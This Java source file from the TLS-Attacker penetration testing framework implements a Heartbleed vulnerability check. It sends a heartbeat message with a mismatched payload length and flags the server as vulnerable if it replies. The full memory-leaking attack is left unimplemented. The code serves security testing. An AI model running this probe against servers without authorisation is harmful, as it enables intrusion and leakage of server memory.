/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.modifiablevariable.singlebyte.ModifiableByte;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.HeartbeatMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.core.util.LogLevel;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.state.TlsContext;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes the Heartbeat attack against a server and logs an error in case the
 * server responds with a valid heartbeat message.
 *
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(HeartbleedAttacker.class);

    public HeartbleedAttacker(HeartbleedCommandConfig config) {
        super(config, false);
    }

    @Override
    public void executeAttack() {
        throw new UnsupportedOperationException("Not implemented yet");
    }

    @Override
    public Boolean isVulnerable() {
        Config tlsConfig = config.createConfig();
        TlsContext tlsContext = new TlsContext(tlsConfig);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getExecutorType(),
                tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();

        ModifiableByte heartbeatMessageType = new ModifiableByte();
        ModifiableInteger payloadLength = new ModifiableInteger();
        payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
        ModifiableByteArray payload = new ModifiableByteArray();
        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
        HeartbeatMessage hb = (HeartbeatMessage) trace
                .getFirstConfiguredSendMessageOfType(ProtocolMessageType.HEARTBEAT);
        hb.setHeartbeatMessageType(heartbeatMessageType);
        hb.setPayload(payload);
        hb.setPayloadLength(payloadLength);

        try {
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.info("The TLS protocol flow was not executed completely, follow the debug messages for more information.");
            LOGGER.debug(ex);
        }

        if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {
            LOGGER.info("Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
            return null;
        } else {
            ProtocolMessage lastMessage = trace.getAllActuallyReceivedMessages().get(
                    trace.getAllActuallyReceivedMessages().size() - 1);
            if (lastMessage.getProtocolMessageType() == ProtocolMessageType.HEARTBEAT) {
                LOGGER.info("Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid Length value");
                return true;
            } else {
                LOGGER.info("(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
                return false;
            }
        }
    }
}
